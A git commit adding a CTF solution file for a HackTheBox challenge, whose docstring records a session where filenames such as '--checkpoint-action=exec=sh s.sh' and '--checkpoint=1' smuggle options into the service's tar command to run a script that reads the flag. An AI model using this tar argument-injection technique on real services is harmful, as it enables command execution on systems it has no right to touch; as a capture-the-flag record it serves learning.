58d9de47724ecdafda11acd9917a0d644b6bf3db
szhan21 <shunda.zhang@intel.com>
2023-04-10 20:04:07 +0800

    Solved MicroStorage!

---
+++ ctf/misc/MicroStorage/dec.py
@@ -0,0 +1,46 @@
+'''
+https://drive.google.com/file/d/1Dk5qX6QYovy8uPOIHn_Zae2urvTAGWj7/view
+https://gtfobins.github.io/gtfobins/tar/#shell
+
+1 => Upload a new file (10 file(s) remaining)
+2 => List your uploaded files (0 file(s) uploaded so far)
+3 => Delete a file
+4 => Print file content
+5 => Compress and download all your files
+0 => Quit (you will lose your files!)
+>>> Choose an option: 1
+[*] Enter your file name: --checkpoint-action=exec=sh s.sh
+[*] Start typing your file content: (send 'EOF' when done)
+EOF
+[+] Your file "--checkpoint-action=exec=sh s.sh" has been saved. (0 bytes written)
+1 => Upload a new file (9 file(s) remaining)
+2 => List your uploaded files (1 file(s) uploaded so far)
+3 => Delete a file
+4 => Print file content
+5 => Compress and download all your files
+0 => Quit (you will lose your files!)
+>>> Choose an option: 1
+[*] Enter your file name: --checkpoint=1
+[*] Start typing your file content: (send 'EOF' when done)
+EOF
+[+] Your file "--checkpoint=1" has been saved. (0 bytes written)
+1 => Upload a new file (8 file(s) remaining)
+2 => List your uploaded files (2 file(s) uploaded so far)
+3 => Delete a file
+4 => Print file content
+5 => Compress and download all your files
+0 => Quit (you will lose your files!)
+>>> Choose an option: 1
+[*] Enter your file name: s.sh
+[*] Start typing your file content: (send 'EOF' when done)
+cat /flag.txtEOF
+[+] Your file "s.sh" has been saved. (13 bytes written)
+1 => Upload a new file (7 file(s) remaining)
+2 => List your uploaded files (3 file(s) uploaded so far)
+3 => Delete a file
+4 => Print file content
+5 => Compress and download all your files
+0 => Quit (you will lose your files!)
+>>> Choose an option: 5
+HTB{@bus1Ng_gTf0_b1N$_c4n_b3_fUn_s0m3t1meS__r1g|-|t??!!__c4fdecf8}
+'''
